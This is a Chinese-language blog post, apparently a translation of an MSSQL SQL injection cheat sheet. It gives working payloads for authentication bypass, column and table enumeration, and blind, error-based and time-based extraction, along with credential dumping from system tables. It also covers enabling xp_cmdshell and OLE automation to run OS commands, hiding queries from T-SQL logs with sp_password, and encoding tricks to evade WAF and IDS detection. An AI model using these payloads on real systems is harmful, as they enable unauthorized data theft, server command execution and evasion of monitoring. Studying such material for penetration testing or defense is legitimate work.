---
title: SQLi MSSQL基础知识
date: 2018-03-21 15:54:24
tags:
		- SQLi
		- 翻译
		 
categories:
		- 翻译
---

翻译：SQL注入之MSSQL篇。

<!-- more -->


#### [MSSQL](https://websec.ca/kb/sql_injection#MSSQL_Default_Databases)


#### 默认数据库

	pubs	Not available on MSSQL 2005
	model	Available in all versions
	msdb	Available in all versions
	tempdb	Available in all versions
	northwind	Available in all versions
	information_schema	Availalble from MSSQL 2000 and higher

#### 注释

当你在注入的时候，以下可以注释掉查询的其他部分

	/*	C-style comment
	--	SQL comment
	;%00	Nullbyte

__例子__

	SELECT * FROM Users WHERE username = '' OR 1=1 --' AND password = '';
	SELECT * FROM Users WHERE id = '' UNION SELECT 1, 2, 3/*';


#### 版本

	@@VERSION

__例子__

	True if MSSQL version is 2008.
	SELECT * FROM Users WHERE id = '1' AND @@VERSION LIKE '%2008%';

输出也会包含`Windows`操作系统的版本。


#### 数据库凭证

	Database..Table	master..syslogins, master..sysprocesses
	Columns	name, loginame
	Current User	user, system_user, suser_sname(), is_srvrolemember('sysadmin')
	Database Credentials	SELECT user, password FROM master.dbo.sysxlogins

__例子__

	Return current user:
	SELECT loginame FROM master..sysprocesses WHERE spid=@@SPID;
	
	Check if user is admin:
	SELECT (CASE WHEN (IS_SRVROLEMEMBER('sysadmin')=1) THEN '1' ELSE '0' END);

#### 数据库名字

	Database.Table	master..sysdatabases
	Column	name
	Current DB	DB_NAME(i)

__例子__

	SELECT DB_NAME(5);
	SELECT name FROM master..sysdatabases;

#### 服务器名字

	@@SERVERNAME
	SERVERPROPERTY()

__例子__

	SELECT SERVERPROPERTY('productversion'), SERVERPROPERTY('productlevel'), SERVERPROPERTY('edition');

__注意__

* SERVERPROPERTY() 适用于`MSSQL 2005`和更高版本

#### 表和列

##### 测试列个数

	ORDER BY n+1;

__例子__

	Given the query: SELECT username, password, permission FROM Users WHERE id = '1';
	
	1' ORDER BY 1--	True
	1' ORDER BY 2--	True
	1' ORDER BY 3--	True
	1' ORDER BY 4--	False - Query is only using 3 columns
	-1' UNION SELECT 1,2,3--	True

__注意__： 依次增加这个数字，直到得到错误的响应。

以下内容可用于获取当前查询中的列。

	GROUP BY / HAVING

__例子__

	Given the query: SELECT username, password, permission FROM Users WHERE id = '1';
	
	1' HAVING 1=1--	Column 'Users.username' is invalid in the select list because it is not contained in either an aggregate function or the GROUP BY clause.
	1' GROUP BY username HAVING 1=1--	Column 'Users.password' is invalid in the select list because it is not contained in either an aggregate function or the GROUP BY clause.
	1' GROUP BY username, password HAVING 1=1--	Column 'Users.permission' is invalid in the select list because it is not contained in either an aggregate function or the GROUP BY clause.
	1' GROUP BY username, password, permission HAVING 1=1--	No Error

__注意__

一旦包含所有的列，将不会返回任何错误。

##### 获取表

可以从`information_schema.tables`和` master..sysobjects`两个数据库中获取表。

__Union__

	UNION SELECT name FROM master..sysobjects WHERE xtype='U'

__Blind__

	
	AND SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables > 'A'

__Error__

	AND 1 = (SELECT TOP 1 table_name FROM information_schema.tables)
	AND 1 = (SELECT TOP 1 table_name FROM information_schema.tables WHERE table_name NOT IN(SELECT TOP 1 table_name FROM information_schema.tables))

__注意__

	Xtype ='U'用于用户定义的表格。 您可以使用'V'查看视图。

##### 获取列

我们可以从`information_schema.columns`和`masters..syscolumns`两个不同的数据库中注入得到列。

__Union__

	UNION SELECT name FROM master..sysobjects WHERE xtype='U'

__Blind__

	AND SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables > 'A'

__Error__


	AND 1 = (SELECT TOP 1 table_name FROM information_schema.tables)
	AND 1 = (SELECT TOP 1 table_name FROM information_schema.tables WHERE table_name NOT IN(SELECT TOP 1 table_name FROM information_schema.tables))

__注意__

`Xtype ='U'`用于用户定义的表格。 您可以使用'V'查看视图。

##### 一次获取多张表和列

以下三个查询将创建一个临时的表/列，并将用户定义的表插入其中。然后它将展示表的内容并删除这个表。

`Create Temp Table/Column and Insert Data:`

	创建一个临时的表/列并插入数据
	AND 1=0; BEGIN DECLARE @xy varchar(8000) SET @xy=':' SELECT @xy=@xy+' '+name FROM sysobjects WHERE xtype='U' AND name>@xy SELECT @xy AS xy INTO TMP_DB END;

`Dump Content`

	AND 1=(SELECT TOP 1 SUBSTRING(xy,1,353) FROM TMP_DB);

`Delete Table`

	AND 1=0; DROP TABLE TMP_DB;

一个更简单的方法适用于`MSSQL 2005`以及高版本。`XML`函数`path`用作连接器，允许一个查询检索所有的表。

	SELECT table_name %2b ', ' FROM information_schema.tables FOR XML PATH('')	SQL Server 2005+

__注意__

可以使用十六进制编码混淆攻击

	' AND 1=0; DECLARE @S VARCHAR(4000) SET @S=CAST(0x44524f50205441424c4520544d505f44423b AS VARCHAR(4000)); EXEC (@S);--


#### 逃逸引号

	SELECT * FROM Users WHERE username = CHAR(97) + CHAR(100) + CHAR(109) + CHAR(105) + CHAR(110)


#### 字符串连接

	SELECT CONCAT('a','a','a'); (SQL SERVER 2012)
	SELECT 'a'+'d'+'mi'+'n';

#### 条件声明

	IF
	CASE

__例子__

	IF 1=1 SELECT 'true' ELSE SELECT 'false';
	SELECT CASE WHEN 1=1 THEN true ELSE false END;

__注意__

IF不能应用在`SELECT`查询里面。

#### 时间

	WAITFOR DELAY 'time_to_pass';
	WAITFOR TIME 'time_to_execute';

__例子__

	IF 1=1 WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:0';

#### OPENROWSET 攻击

	SELECT * FROM OPENROWSET('SQLOLEDB', '127.0.0.1';'sa';'p4ssw0rd', 'SET FMTONLY OFF execute master..xp_cmdshell "dir"');


#### 系统命令执行

包含一个名为`xp_cmdshell`的扩展存储过程，可用于执行操作系统命令。

	EXEC master.dbo.xp_cmdshell 'cmd';

从`MSSQL 2005`之后的版本，`xp_cmsshell`默认不再开启，使用以下命令可以手动开启。

	EXEC sp_configure 'show advanced options', 1
	EXEC sp_configure reconfigure
	EXEC sp_configure 'xp_cmdshell', 1
	EXEC sp_configure reconfigure

或者，你可以创建自己的程序来达到同样的结果。


	DECLARE @execmd INT
	EXEC SP_OACREATE 'wscript.shell', @execmd OUTPUT
	EXEC SP_OAMETHOD @execmd, 'run', null, '%systemroot%\system32\cmd.exe /c'

如果这个`MSSQL`版本高于2000，你需要再另外执行以下的命令，才能让上述命令执行成功。

	EXEC sp_configure 'show advanced options', 1
	EXEC sp_configure reconfigure
	EXEC sp_configure 'OLE Automation Procedures', 1
	EXEC sp_configure reconfigure

__例子__

	Checks to see if xp_cmdshell is loaded, if it is, it checks if it is 
	active and then proceeds to run the 'dir' command and inserts the results into TMP_DB:
	
	' IF EXISTS (SELECT 1 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME='TMP_DB') DROP TABLE TMP_DB DECLARE @a varchar(8000) IF EXISTS(SELECT * FROM dbo.sysobjects WHERE id = object_id (N'[dbo].[xp_cmdshell]') AND OBJECTPROPERTY (id, N'IsExtendedProc') = 1) BEGIN CREATE TABLE %23xp_cmdshell (name nvarchar(11), min int, max int, config_value int, run_value int) INSERT %23xp_cmdshell EXEC master..sp_configure 'xp_cmdshell' IF EXISTS (SELECT * FROM %23xp_cmdshell WHERE config_value=1)BEGIN CREATE TABLE %23Data (dir varchar(8000)) INSERT %23Data EXEC master..xp_cmdshell 'dir' SELECT @a='' SELECT @a=Replace(@a%2B'<br></font><font color="black">'%2Bdir,'<dir>','</font><font color="orange">') FROM %23Data WHERE dir>@a DROP TABLE %23Data END ELSE SELECT @a='xp_cmdshell not enabled' DROP TABLE %23xp_cmdshell END ELSE SELECT @a='xp_cmdshell not found' SELECT @a AS tbl INTO TMP_DB--

显示内容

	' UNION SELECT tbl FROM TMP_DB--

删除表

	' DROP TABLE TMP_DB--


#### 隐藏查询

将`sp_password`附加到查询的末尾会将其从T-SQL日志中隐藏，作为安全措施。

__例子__

	' AND 1=1--sp_password

__输出__

- 在此事件的文本中找到'sp_password'。
- 出于安全原因，文字已被此注释取代。

#### 堆查询

`MSSQL`支持堆查询

	' AND 1=0 INSERT INTO ([column1], [column2]) VALUES ('value1', 'value2');


#### 模糊和混淆

##### 允许其他字符

以下的字符可以被用作空格

	01	Start of Heading
	02	Start of Text
	03	End of Text
	04	End of Transmission
	05	Enquiry
	06	Acknowledge
	07	Bell
	08	Backspace
	09	Horizontal Tab
	0A	New Line
	0B	Vertical Tab
	0C	New Page
	0D	Carriage Return
	0E	Shift Out
	0F	Shift In
	10	Data Link Escape
	11	Device Control 1
	12	Device Control 2
	13	Device Control 3
	14	Device Control 4
	15	Negative Acknowledge
	16	Synchronous Idle
	17	End of Transmission Block
	18	Cancel
	19	End of Medium
	1A	Substitute
	1B	Escape
	1C	File Separator
	1D	Group Separator
	1E	Record Separator
	1F	Unit Separator
	20	Space
	25	%

__例子__

	S%E%L%E%C%T%01column%02FROM%03table;
	A%%ND 1=%%%%%%%%1;

__注意__

百分号关键字仅适用于`ASP`的`Web`应用程序。

以下的字符也可以避免使用空格。


	22	"
	28	(
	29	)
	5B	[
	5D	]

__例子__

	UNION(SELECT(column)FROM(table));
	SELECT"table_name"FROM[information_schema].[tables];

##### 在AND/OR 之后使用的其他字符

	01 - 20	Range
	21	!
	2B	+
	2D	-
	2E	.
	5C	\
	7E	~

__例子__

	SELECT 1FROM[table]WHERE\1=\1AND\1=\1;

__注意__

反斜杠似乎不适用于`MSSQL 2000`。

##### 编码

对你的注入语句进行编码，有时候可以绕过`WAF/IDS`。


	URL Encoding	SELECT %74able_%6eame FROM information_schema.tables;
	Double URL Encoding	SELECT %2574able_%256eame FROM information_schema.tables;
	Unicode Encoding	SELECT %u0074able_%u6eame FROM information_schema.tables;
	Invalid Hex Encoding (ASP)	SELECT %tab%le_%na%me FROM information_schema.tables;
	Hex Encoding	' AND 1=0; DECLARE @S VARCHAR(4000) SET @S=CAST(0x53454c4543542031 AS VARCHAR(4000)); EXEC (@S);--
	HTML Entities (Needs to be verified)	%26%2365%3B%26%2378%3B%26%2368%3B%26%2332%3B%26%2349%3B%26%2361%3B%26%2349%3B

#### 密码加密

密码以0x0100开始，0x之后的第一个字节是常量;接下来的八个字节是散列盐，剩余的80个字节是两个散列，前40个字节是密码的区分大小写散列，而第二个40个字节是大写。

	0x0100236A261CE12AB57BA22A7F44CE3B780E52098378B65852892EEE91C0784B911D76BF4EB124550ACABDFD1457

#### 密码破解

一个`Metasploit`模块[JTR](http://www.metasploit.com/modules/auxiliary/analyze/jtr_mssql_fast)可以进行破解密码。


